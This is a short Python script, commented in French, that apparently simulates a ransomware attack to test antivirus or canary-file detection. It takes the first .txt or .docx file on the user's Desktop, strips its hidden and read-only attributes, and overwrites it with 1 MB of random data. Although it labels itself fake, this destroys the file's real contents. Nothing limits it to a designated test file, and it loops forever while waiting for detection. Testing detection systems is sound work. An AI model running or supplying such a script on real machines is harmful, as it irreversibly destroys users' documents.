import os
import time
import subprocess
from pathlib import Path

# On cherche un fichier canary
bureau = Path.home() / "Desktop"
canary_files = list(bureau.glob("*.txt")) + list(bureau.glob("*.docx"))

if not canary_files:
    print("Aucun fichier trouvé sur le bureau !")
    exit()

cible = canary_files[0]
print(f"😈 [RANSOMWARE FAKE] Début de l'attaque sur : {cible.name}")

try:
    # IMPORTANT: On enlève l'attribut 'Caché' (-H) et 'Lecture Seule' (-R) pour forcer l'écriture Windows
    subprocess.run(["attrib", "-H", "-R", str(cible)], check=False, capture_output=True)
    time.sleep(0.5)

    with open(cible, "wb") as f:
        f.write(os.urandom(1024 * 1024)) # 1 MB de données illisibles (Maximum Entropie)
        print(f"😈 [RANSOMWARE FAKE] Fichier {cible.name} crypté avec succès !")
        print("😈 [RANSOMWARE FAKE] J'attends la punition de l'antivirus... (Patientez...)")
        
        while True:
            time.sleep(1)
except Exception as e:
    print("❌ Erreur : ", e)
